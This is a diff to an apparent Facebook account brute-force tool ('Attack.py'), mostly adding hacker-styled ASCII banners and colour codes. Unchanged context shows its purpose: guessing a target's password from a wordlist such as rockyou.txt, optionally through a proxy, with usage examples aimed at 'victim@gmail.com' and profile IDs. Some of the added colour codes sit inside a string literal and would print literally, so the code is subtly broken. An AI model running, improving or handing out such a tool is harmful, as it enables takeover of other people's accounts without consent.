@@ -124,26 +124,36 @@ def FBOM(username, wordlist, proxy=None,passwd=None):
     prox = gr+useproxy.split(":")[0]+wi+":"+yl+useproxy.split(":")[1] if useproxy !=False else ""
     proxystatus = prox+wi+"["+gr+"ON"+wi+"]" if useproxy !=False else yl+"["+rd+"OFF"+yl+"]"
     print(gr+"""
-==================================
-[---]        """+wi+"""lovehacker"""+gr+"""         [---]
-
+=========================================
+        """+wi+"""lovehacker"""+wi+"""       
 ╭━━╮╭╮╱╱╱╱╱╱╭╮╱╭━╮╭━╮╱╱╱╭━╮
 ┃╭╮┃┃┃╱╱╱╱╱╱┃┃╱┃┃╰╯┃┃╱╱╱┃╭╯
 ┃╰╯╰┫┃╭━━┳━━┫┃╭┫╭╮╭╮┣━━┳╯╰┳┳━━╮
 ┃╭━╮┃┃┃╭╮┃╭━┫╰╯┫┃┃┃┃┃╭╮┣╮╭╋┫╭╮┃
 ┃╰━╯┃╰┫╭╮┃╰━┫╭╮┫┃┃┃┃┃╭╮┃┃┃┃┃╭╮┃
-╰━━━┻━┻╯╰┻━━┻╯╰┻╯╰╯╰┻╯╰╯╰╯╰┻╯╰╯
-==================================
-[---]  """+wi+"""BruteForce Facebook  """+gr+""" [---]
-==================================
-[---]        """+yl+"""BlackMafia"""+gr+"""         [---]
-==================================
+╰━━━┻━┻╯╰┻━━┻╯╰┻╯╰╯╰┻╯╰╯╰╯╰┻╯╰╯"""+gr+"""
+=========================================
+ """+rd+"""
+▀▀█▀▀ █▀▀█ █▀▀█ █▀▀▀ █▀▀ ▀▀█▀▀ 
+─░█── █▄▄█ █▄▄▀ █─▀█ █▀▀ ──█── 
+─░█── ▀──▀ ▀─▀▀ ▀▀▀▀ ▀▀▀ ──▀──  """+gr+"""
+========================================
+     """+yl+"""
+╔╗─╔╗─────╔╗
+║║─║║─────║║
+║╚═╝╠══╦══╣║╔╦╦═╗╔══╗
+║╔═╗║╔╗║╔═╣╚╝╬╣╔╗╣╔╗║
+║║─║║╔╗║╚═╣╔╗╣║║║║╚╝║
+╚╝─╚╩╝╚╩══╩╝╚╩╩╝╚╩═╗║
+─────────────────╔═╝║
+─────────────────╚══╝"""+gr+"""      
+========================================
 [>] Target      :> """+wi+username+gr+"""
 {}""".format("[>] Wordlist    :> "+yl+str(wordlist) if passwd==None else "[>] Password    :> "+yl+str(passwd))+gr+"""
 [>] ProxyStatus :> """+str(proxystatus)+gr+"""      
-=================================="""+wi+"""
+======================================="""+wi+"""
 [~] """+yl+"""Brute"""+rd+""" ForceATTACK: """+gr+"""Enabled """+wi+"""[~]"""+gr+"""
-==================================
+=======================================
 """)
     loop = 1
     br=mechanize.Browser()
@@ -218,32 +228,32 @@ def FBOM(username, wordlist, proxy=None,passwd=None):
 
 parse = optparse.OptionParser(wi+"""
 Usage: python ./Attack.py [OPTIONS...]
--------------
+-------------"+rd+"
 OPTIONS:
        |
     |--------    
-    | -t <target email> [OR] <FACEBOOK ID>    ::> Specify target Email [OR] Target Profile ID
+    |"+yl+" -t <target email> [OR] <FACEBOOK ID>    ::> Specify target Email [OR] Target Profile ID
     |--------
-    | -w <wordlist Path>                      ::> Specify Wordlist File Path
+    | "+yl+"-w <wordlist Path>                      ::> Specify Wordlist File Path
     |--------
-    | -s <single password>                     ::> Specify Single Password To Check
+    | "+yl+"-s <single password>                     ::> Specify Single Password To Check
     |--------
-    | -p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)
+    | "+yl+"-p <Proxy IP:PORT>                      ::> Specify HTTP/S Proxy (Optional)
     |--------
-    | -g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
+    | "+yl+"-g <TARGET Facebook Profile URL>        ::> Specify Target Facebook Profile URL For Get HIS ID
 -------------
 Examples:
         |
      |--------
-     | python Attack.py -t victim@gmail.com -w /usr/share/wordlists/rockyou.txt
+     | "+yl+"python Attack.py "+rd+"-t victim@gmail.com "+gr+"-w /usr/share/wordlists/rockyou.txt
      |--------
-     | python Attack.py -t 100001013078780 -w C:\\Users\\Me\\Desktop\\wordlist.txt
+     | "+yl+"python Attack.py "+rd+"-t 100001013078780 "+gr+"-w C:\\Users\\Me\\Desktop\\wordlist.txt
      |--------
-     | python Attack.py -t victim@hotmail.com -w D:\\wordlist.txt -p 35.236.37.121 default(port=8080,80) 
+     | "+yl+"python Attack.py "+rd+"-t victim@hotmail.com "+gr+"-w D:\\wordlist.txt "+yl+"-p 35.236.37.121 "+gr+"default(port=8080,80) 
      |--------
-     | python Attack.py -t victim@gmail.com -s 1234567
+     | "+yl+"python Attack.py "+rd+"-t victim@gmail.com "+gr+"-s 1234567
      |-------- 
-     | python Attack.py -g https://www.facebook.com/lovehacker 
+     | "+yl+"python Attack.py "+rd+"-g https://www.facebook.com/lovehacker 
      |-------- 
 """)
 def Main():
